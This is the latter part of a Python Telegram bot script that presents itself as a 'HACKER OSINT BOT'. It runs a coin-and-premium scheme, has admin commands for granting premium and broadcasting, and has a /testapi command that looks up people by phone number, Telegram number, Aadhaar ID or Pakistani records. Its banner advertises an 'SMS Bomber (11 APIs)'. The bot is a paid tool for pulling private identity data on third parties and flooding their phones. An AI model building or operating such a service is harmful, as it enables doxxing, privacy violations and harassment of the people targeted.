        bot.send_message(m.chat.id, "📱 Menu", reply_markup=group_menu(l)); return
    coins = gc(m.from_user.id)
    status = "💎 **Premium**" if ip(m.from_user.id) else f"🪙 **Coins:** {coins}"
    bot.send_message(m.chat.id, f"{L[l]['main_menu']}\n\n{status}", reply_markup=main_menu(l), parse_mode='Markdown')

@bot.message_handler(commands=['claim'])
def cl2(m):
    l = gl(m.from_user.id)
    if claim_daily_coin(m.from_user.id):
        coins = gc(m.from_user.id)
        bot.reply_to(m, L[l]['coin_claimed'].format(coins=coins), parse_mode='Markdown')
    else:
        bot.reply_to(m, L[l]['already_claimed'])

@bot.message_handler(commands=['premium'])
def pm(m):
    l = gl(m.from_user.id)
    if ip(m.from_user.id): bot.reply_to(m, "🎉 Already premium!"); return
    try:
        with open(QR_PATH, 'rb') as qr:
            bot.send_photo(m.chat.id, qr, caption=L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')
    except:
        bot.send_message(m.chat.id, L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')

@bot.message_handler(commands=['profile'])
def pr2(m):
    uid = m.from_user.id
    ensure_user(uid, m.from_user.first_name or "User", m.from_user.username or "")
    coins = gc(uid)
    prem = "✅ Active" if ip(uid) else "❌ Inactive"
    searches = 0
    try:
        cur = conn.cursor()
        cur.execute("SELECT searches FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone(); searches = r[0] if r else 0
    except: pass
    l = gl(uid)
    bot.reply_to(m, L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches), parse_mode='Markdown')

@bot.message_handler(commands=['contact'])
def ct(m): bot.reply_to(m, f"📞 {OWNER}\n🌐 {WEBSITE}")

@bot.message_handler(commands=['clear'])
def clear_cmd(m):
    try:
        bot.delete_message(m.chat.id, m.message_id)
        bot.reply_to(m, "🗑️")
    except: bot.reply_to(m, "❌")

@bot.message_handler(commands=['help'], chat_types=['private'])
def hp(m):
    bot.reply_to(m, L[gl(m.from_user.id)]['help'], parse_mode='Markdown')

@bot.message_handler(commands=['language', 'lang'])
def lg(m):
    bot.send_message(m.chat.id, L['en']['lang'], reply_markup=lang_selection(), parse_mode='Markdown')

@bot.message_handler(commands=['website', 'site'])
def wsite(m):
    bot.reply_to(m, f"🌐 **Website**\n👉 {WEBSITE}",
                 reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🌐 Visit", url=WEBSITE)),
                 parse_mode='Markdown')

@bot.message_handler(commands=['pin'])
def pin_command(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "⚠️ Not authorized."); return
    if m.reply_to_message:
        try:
            bot.pin_chat_message(m.chat.id, m.reply_to_message.message_id)
            bot.reply_to(m, "📌 Pinned!")
        except: bot.reply_to(m, "❌ Pin failed.")
    else: bot.reply_to(m, "❌ Reply with /pin")

# ==================== ADMIN ====================
@bot.message_handler(commands=['addpremium'])
def ap2(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid, days = m.text.split()
        uid_int = int(uid); days_int = int(days)
        if ap(uid_int, days_int):
            bot.reply_to(m, f"✅ Premium → `{uid_int}` ({days_int}d)", parse_mode='Markdown')
            try: bot.send_message(uid_int, f"🎉 **Premium Activated!**\n⏰ {days_int} days", parse_mode='Markdown')
            except: pass
    except: bot.reply_to(m, "❌ /addpremium [uid] [days]")

@bot.message_handler(commands=['removepremium'])
def rp(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid = m.text.split()
        c.execute("UPDATE users SET premium=0, premium_expiry=NULL WHERE user_id=?", (int(uid),)); conn.commit()
        _prem_cache.pop(int(uid), None)
        bot.reply_to(m, f"✅ Removed from `{uid}`", parse_mode='Markdown')
    except: bot.reply_to(m, "❌ /removepremium [uid]")

@bot.message_handler(commands=['addcoins'])
def ac(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid, coins = m.text.split()
        uid_int = int(uid); coins_int = int(coins)
        new_coins = add_coins_db(uid_int, coins_int)
        bot.reply_to(m, f"✅ Coins → `{uid_int}`\n🪙 Total: **{new_coins}**", parse_mode='Markdown')
        try: bot.send_message(uid_int, f"🪙 **+{coins_int} Coins!** Total: {new_coins}", parse_mode='Markdown')
        except: pass
    except: bot.reply_to(m, "❌ /addcoins [uid] [coins]")

@bot.message_handler(commands=['userinfo'])
def userinfo_cmd(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid = m.text.split()
        uid_int = int(uid)
        cur = conn.cursor()
        cur.execute("SELECT user_id, first_name, username, coins, premium, premium_expiry, searches FROM users WHERE user_id=?", (uid_int,))
        r = cur.fetchone()
        if not r: bot.reply_to(m, "❌ User not in DB."); return
        fn_safe = _md_escape(r[1] or 'N/A')
        un_safe = _md_escape(r[2] or 'N/A')
        bot.reply_to(m, f"👤 ID: `{r[0]}`\n👤 {fn_safe}\n@ {un_safe}\n🪙 {r[3]}\n💎 {'✅' if ip(uid_int) else '❌'}\n🔍 {r[6]}", parse_mode='Markdown')
    except: bot.reply_to(m, "❌ /userinfo [uid]")

@bot.message_handler(commands=['users'])
def us(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        c.execute("SELECT user_id, username, coins, premium FROM users ORDER BY user_id DESC LIMIT 20")
        users = c.fetchall()
        if not users: bot.reply_to(m, "No users."); return
        text = "📋 **Users:**\n"
        for u in users:
            un_safe = _md_escape(u[1] or 'N/A')
            text += f"🆔 `{u[0]}` @{un_safe} 🪙{u[2]} {'💎' if u[3] else ''}\n"
        bot.reply_to(m, text, parse_mode='Markdown')
    except: pass

@bot.message_handler(commands=['stats'])
def st2(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        c.execute("SELECT COUNT(*) FROM users"); total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE access=1"); access = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE premium=1"); premium = c.fetchone()[0]
        c.execute("SELECT SUM(coins) FROM users"); coins = c.fetchone()[0] or 0
        searches = get_total_searches()
        bot.reply_to(m, L[gl(m.from_user.id)]['stats_text'].format(total=total, access=access, premium=premium, coins=coins, searches=searches), parse_mode='Markdown')
    except: pass

@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if m.from_user.id != ADMIN_ID: return
    msg = m.text.replace('/broadcast', '').strip()
    if not msg: bot.reply_to(m, "❌ /broadcast [message]"); return
    def send_bc():
        try:
            c.execute("SELECT user_id FROM users"); users = c.fetchall()
            sent = 0
            for uid in users:
                try:
                    # ✅ FIX: no parse_mode to avoid markdown crash
                    bot.send_message(uid[0], "📢 Announcement\n\n" + msg)
                    sent += 1
                    time.sleep(0.05)
                except: pass
            bot.send_message(ADMIN_ID, f"✅ Broadcast sent to {sent} users!")
        except Exception as e:
            try: bot.send_message(ADMIN_ID, f"❌ Broadcast error")
            except: pass
    threading.Thread(target=send_bc, daemon=True).start()
    bot.reply_to(m, "📢 Broadcasting in background...")

@bot.message_handler(commands=['testapi'])
def test_api(m):
    if m.from_user.id != ADMIN_ID: return
    parts = m.text.split()
    if len(parts) < 3: bot.reply_to(m, "❌ /testapi [type] [value]\nTypes: num, special, tg, aadharspl, pk, aadhaar"); return
    typ = parts[1].lower(); val = parts[2].strip()
    if typ == "num": data = fetch_number(val)
    elif typ == "special": data = fetch_special(val)
    elif typ == "tg": data = fetch_tg_number(val)
    elif typ == "aadharspl": data = fetch_aadhaar_special(val)
    elif typ == "pk": data = fetch_pakistan(val)
    elif typ == "aadhaar": data = fetch_aadhaar(val)
    else: bot.reply_to(m, "❌ Invalid type"); return
    if data: 
        try: bot.reply_to(m, f"✅ ```json\n{json.dumps(data, indent=2)[:3500]}\n```", parse_mode='Markdown')
        except: bot.reply_to(m, "✅ Data received but too complex")
    else: bot.reply_to(m, "❌ No data")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("=" * 55)
    print("🔥 HACKER OSINT BOT v3.0 — FINAL PATCHED")
    print("=" * 55)
    print(f"👨‍💻 Owner: {OWNER}")
    print(f"🌐 Website: {WEBSITE}")
    print("-" * 55)
    print("✅ 4 Bugs Fixed (markdown escapes)")
    print("✅ 2x FASTER (ultra fast loading)")
    print("✅ Connection pooling (persistent TCP)")
    print("✅ Premium status cached (60s)")
    print("✅ Language cached (in-memory)")
    print("✅ Parallel API fetch")
    print("-" * 55)
    print("✅ 8 Search Types")
    print("✅ SMS Bomber (11 APIs)")
    print("✅ 6 Languages")
    print("✅ Premium + Coins")
    print("✅ GROUP + PRIVATE Auto-Detect")
    print("=" * 55)
    bot.infinity_polling(timeout=30, long_polling_timeout=30)